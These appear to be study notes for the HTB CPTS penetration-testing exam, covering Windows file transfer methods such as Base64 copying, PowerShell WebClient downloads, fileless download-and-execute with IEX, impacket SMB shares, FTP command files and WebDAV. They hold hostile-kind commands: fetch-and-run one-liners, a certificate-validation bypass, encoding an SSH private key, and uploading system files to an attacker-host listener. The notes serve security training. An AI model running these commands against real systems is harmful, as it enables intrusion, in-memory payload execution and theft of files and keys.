# Windows File Transfer Methods

## 1. Core Concept

Windows file transfers can be performed using **native tools and protocols**, often without installing additional software.

### Common Transfer Methods

| Method     | Direction         | Key Tool / Protocol              |
| ---------- | ----------------- | -------------------------------- |
| Base64     | Upload / Download | PowerShell                       |
| HTTP/HTTPS | Upload / Download | `WebClient`, `Invoke-WebRequest` |
| SMB        | Upload / Download | `impacket-smbserver`, `copy`     |
| WebDAV     | Upload / Download | `wsgidav`                        |
| FTP        | Upload / Download | `pyftpdlib`, `ftp`, `WebClient`  |

### Fileless Concept

`Fileless` does **not necessarily mean no file transfer**.

A payload may be downloaded and executed **directly in memory** instead of being written to disk.

### Astaroth Attack Chain — Important Example

```text
Spear-phishing email
        ↓
      LNK file
        ↓
      WMIC
        ↓
  Malicious JavaScript
        ↓
    Bitsadmin
        ↓
 Base64-encoded payloads
        ↓
     Certutil
        ↓
      DLL files
        ↓
    Regsvr32
        ↓
 DLL decrypts/loads additional files
        ↓
 Payload injected into Userinit
```

**Exam takeaway:** Windows native tools can be chained together for file transfer and execution while potentially bypassing traditional defenses.

# 2. Download Operations

## 2.1 PowerShell Base64 Transfer

Useful when:

* No network communication is desired/possible.
* You have terminal access.
* File size is manageable.
* You can copy/paste a Base64 string.

### Workflow

```text
Linux/Pwnbox:
File → Base64 → Copy

Windows:
Base64 → Decode → File

Verify:
MD5 hash comparison
```

### Check MD5 on Pwnbox

```bash
md5sum id_rsa
```

Example:

```text
4e301756a07ded0a2dd6953abf015278
```

### Encode File on Linux

```bash
cat id_rsa | base64 -w 0; echo
```

### Decode on Windows

```powershell
[IO.File]::WriteAllBytes(
    "C:\Users\Public\id_rsa",
    [Convert]::FromBase64String("<BASE64>")
)
```

### Verify on Windows

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

The hashes should match.

### Important Limitation

Windows `cmd.exe` has a maximum command-line string length of approximately:

```text
8,191 characters
```

Very large Base64 strings may therefore fail.

Web shells can also have limitations when handling extremely large strings.

# 3. PowerShell Web Downloads

HTTP/HTTPS is commonly allowed outbound because organizations need web access.

Possible defensive controls include:

* Web filtering
* Blocking certain file types
* Domain allowlists
* Restricted outbound access

---

## 3.1 `Net.WebClient`

PowerShell's `.NET WebClient` supports:

* HTTP
* HTTPS
* FTP

### Important Methods

| Method                | Purpose                               |
| --------------------- | ------------------------------------- |
| `OpenRead`            | Returns resource as a Stream          |
| `OpenReadAsync`       | Asynchronous Stream                   |
| `DownloadData`        | Returns downloaded data as byte array |
| `DownloadDataAsync`   | Async byte-array download             |
| `DownloadFile`        | Downloads directly to file            |
| `DownloadFileAsync`   | Async file download                   |
| `DownloadString`      | Returns downloaded data as String     |
| `DownloadStringAsync` | Async String download                 |

---

## 3.2 `DownloadFile`

### Syntax

```powershell
(New-Object Net.WebClient).DownloadFile(
    '<URL>',
    '<OUTPUT_FILE>'
)
```

### Example

```powershell
(New-Object Net.WebClient).DownloadFile(
    'https://example.com/file.ps1',
    'C:\Users\Public\Downloads\file.ps1'
)
```

### Async

```powershell
(New-Object Net.WebClient).DownloadFileAsync(
    'https://example.com/file.ps1',
    'C:\Users\Public\Downloads\file.ps1'
)
```

**Key point:** `DownloadFile` writes the file to disk.

# 4. PowerShell Fileless Download

Instead of downloading a script to disk, it can be retrieved as a string and passed directly to PowerShell.

### `IEX` / `Invoke-Expression`

```powershell
IEX (New-Object Net.WebClient).DownloadString(
    'https://example.com/script.ps1'
)
```

Equivalent pipeline form:

```powershell
(New-Object Net.WebClient).DownloadString(
    'https://example.com/script.ps1'
) | IEX
```

### Key Concept

```text
DownloadString
      ↓
   String
      ↓
      IEX
      ↓
Execute in memory
```

This is a **fileless execution pattern** because the script does not need to be saved to disk.

# 5. `Invoke-WebRequest`

Available from **PowerShell 3.0+**.

Aliases:

```text
iwr
curl
wget
```

### Download File

```powershell
Invoke-WebRequest https://example.com/file.ps1 -OutFile file.ps1
```

### Important

`Invoke-WebRequest` is described in the HTB material as noticeably slower than some other PowerShell download methods.

---

## 5.1 Common `Invoke-WebRequest` Error

Older Windows environments may have Internet Explorer first-launch/configuration issues.

Error can indicate:

```text
Internet Explorer engine is not available
```

### Bypass

Use:

```powershell
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing
```

Example with execution:

```powershell
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX
```

---

## 5.2 SSL/TLS Certificate Error

Possible error:

```text
Could not establish trust relationship for the SSL/TLS secure channel.
```

The HTB material demonstrates:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**Exam note:** This bypasses certificate validation and should be treated as an insecure workaround.

# 6. SMB Downloads

## SMB Basics

```text
Protocol: SMB
Port: TCP/445
```

SMB is commonly available in Windows enterprise environments.

### Basic workflow

```text
Pwnbox
  ↓
SMB Server
  ↓
Windows Target
  ↓
copy / Copy-Item
```

---

## 6.1 Start Impacket SMB Server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### Copy File from SMB Share

```cmd
copy \\192.168.220.133\share\nc.exe
```

---

## 6.2 SMB Authentication

Modern Windows versions may block unauthenticated guest access.

### Start SMB Server with Credentials

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare \
-user test -password test
```

### Mount Share

```cmd
net use n: \\192.168.220.133\share /user:test test
```

### Copy File

```cmd
copy n:\nc.exe
```

### Exam Tip

If direct:

```cmd
copy \\IP\share\file
```

fails due to authentication/access restrictions, try:

```cmd
net use
```

to map the SMB share with credentials.

# 7. FTP Downloads

## FTP Ports

```text
TCP/21 → FTP control
TCP/20 → FTP data
```

---

## 7.1 Start FTP Server

Install:

```bash
sudo pip3 install pyftpdlib
```

Start server:

```bash
sudo python3 -m pyftpdlib --port 21
```

By default, `pyftpdlib` normally uses port `2121`, so explicitly specify `--port 21` when required.

Anonymous authentication is enabled by default if no user/password is configured.

---

## 7.2 Download Using PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile(
    'ftp://192.168.49.128/file.txt',
    'C:\Users\Public\ftp-file.txt'
)
```

---

## 7.3 FTP Non-Interactive Download

Useful when the shell is not interactive.

### Create FTP Command File

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

### Execute

```cmd
ftp -v -n -s:ftpcommand.txt
```

### Verify

```cmd
more file.txt
```

### Key Option

```text
-s:<file>
```

tells the Windows FTP client to execute commands from a file.

# 8. Upload Operations

Uploads are useful for:

* Password cracking
* Analysis
* Exfiltration
* Moving collected files to the attack host

The same general mechanisms used for downloads can often be reversed for uploads.

# 9. PowerShell Base64 Upload

## Windows → Pwnbox

### Encode File on Windows

```powershell
[Convert]::ToBase64String(
    (Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)
)
```

### Get MD5

```powershell
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 |
select Hash
```

Copy the Base64 output to the Linux/Pwnbox system.

### Decode on Linux

```bash
echo <BASE64> | base64 -d > hosts
```

### Verify

```bash
md5sum hosts
```

The MD5 should match the Windows hash.

# 11. PowerShell Base64 Web Upload

Another upload technique:

```text
Windows
  ↓
Read file as bytes
  ↓
Base64 encode
  ↓
HTTP POST
  ↓
Netcat listener
  ↓
Base64 decode
  ↓
Original file
```

### Encode

```powershell
$b64 = [System.convert]::ToBase64String(
    (Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)
)
```

### POST

```powershell
Invoke-WebRequest `
    -Uri http://192.168.49.128:8000/ `
    -Method POST `
    -Body $b64
```

### Receive with Netcat

```bash
nc -lvnp 8000
```

The Base64 content will appear in the HTTP POST body.

### Decode

```bash
echo <base64> | base64 -d -w 0 > hosts
```

# 13. WebDAV

## WebDAV Concept

**WebDAV** = Web Distributed Authoring and Versioning.

It extends HTTP so a web server can behave similarly to a file server.

Can operate over:

```text
HTTP
HTTPS
```

### Why WebDAV?

If SMB/TCP 445 is restricted, WebDAV can provide file access over HTTP.

Conceptually:

```text
SMB request
   ↓
No SMB share
   ↓
HTTP/WebDAV
```

---

## 13.1 Install WebDAV Server

```bash
sudo pip3 install wsgidav cheroot
```

### Start

```bash
sudo wsgidav \
    --host=0.0.0.0 \
    --port=80 \
    --root=/tmp \
    --auth=anonymous
```

**Important:** This configuration provides anonymous read/write access to the configured root.

---

# 14. `DavWWWRoot`

Windows recognizes:

```text
DavWWWRoot
```

as a special keyword for WebDAV.

### Connect

```cmd
dir \\192.168.49.128\DavWWWRoot
```

`DavWWWRoot` is **not an actual folder** on the WebDAV server.

It tells the Windows WebDAV Mini-Redirector to connect to the root of the WebDAV server.

### Example

```cmd
dir \\192.168.49.128\DavWWWRoot
```

If using an existing directory, the keyword may be unnecessary:

```cmd
dir \\192.168.49.128\sharefolder
```

---

## 14.1 Upload via WebDAV

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \
\\192.168.49.129\DavWWWRoot\
```

Or:

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \
\\192.168.49.129\sharefolder\
```

### Exam Decision Point

```text
TCP/445 allowed?
      │
 ┌────┴────┐
Yes        No
 │          │
SMB       WebDAV
```

If SMB is unrestricted, the HTB material also uses:

```bash
impacket-smbserver
```

# 15. FTP Uploads

For FTP uploads, the FTP server must allow writing.

### Start FTP Server with Write Permission

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

---

## 15.1 PowerShell FTP Upload

```powershell
(New-Object Net.WebClient).UploadFile(
    'ftp://192.168.49.128/ftp-hosts',
    'C:\Windows\System32\drivers\etc\hosts'
)
```

---

## 15.2 FTP Upload Using Command File

### Build command file

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

### Execute

```cmd
ftp -v -n -s:ftpcommand.txt
```

### Important FTP Commands

| Command  | Purpose                    |
| -------- | -------------------------- |
| `open`   | Connect to FTP server      |
| `USER`   | Specify username           |
| `binary` | Use binary transfer mode   |
| `GET`    | Download file              |
| `PUT`    | Upload file                |
| `bye`    | Exit FTP                   |
| `-s:`    | Execute commands from file |

# 17. Hash Verification

Always verify transfers when possible.

### Linux

```bash
md5sum file
```

### PowerShell

```powershell
Get-FileHash file -Algorithm MD5
```

### Transfer validation

```text
Source MD5
    ↓
Transfer
    ↓
Destination MD5
    ↓
Compare
```

If hashes match:

```text
Transfer contents are consistent with the source.
```

# 18. Exam Decision Tree

```text
Need to transfer a file?
        │
        ├── No network required?
        │       ↓
        │    Base64
        │
        ├── HTTP/HTTPS available?
        │       │
        │       ├── Download to disk
        │       │      → WebClient DownloadFile
        │       │      → Invoke-WebRequest
        │       │
        │       └── Script/fileless
        │              → DownloadString | IEX
        │
        ├── SMB/TCP 445 available?
        │       ↓
        │   impacket-smbserver
        │
        ├── SMB blocked?
        │       ↓
        │   WebDAV over HTTP
        │
        └── FTP available?
                ↓
             pyftpdlib
```

# 19. High-Value CPTS Facts

* **SMB = TCP/445**
* **FTP = TCP/21 control + TCP/20 data**
* **WebDAV extends HTTP for file-server-like functionality**
* `DavWWWRoot` is a **Windows-recognized WebDAV keyword**, not a real server directory.
* `Net.WebClient` supports **HTTP, HTTPS, and FTP**.
* `DownloadFile` → saves to disk.
* `DownloadString` → returns content as a string.
* `IEX` / `Invoke-Expression` → executes PowerShell content.
* `Invoke-WebRequest` aliases → `iwr`, `curl`, `wget`.
* `-UseBasicParsing` can bypass certain legacy Internet Explorer parsing/configuration issues.
* `Get-FileHash` can verify transferred files.
* Base64 transfer avoids network communication but is limited by command/string size.
* Modern Windows may block **unauthenticated SMB guest access**.
* `net use` can mount an SMB share using credentials.
* `pyftpdlib --write` enables FTP upload capability.
* WebDAV is useful when **SMB/445 is restricted**.
* FTP command files are useful when an **interactive FTP session is unavailable**.
* Fileless execution can involve **retrieving a payload without writing it to disk**.
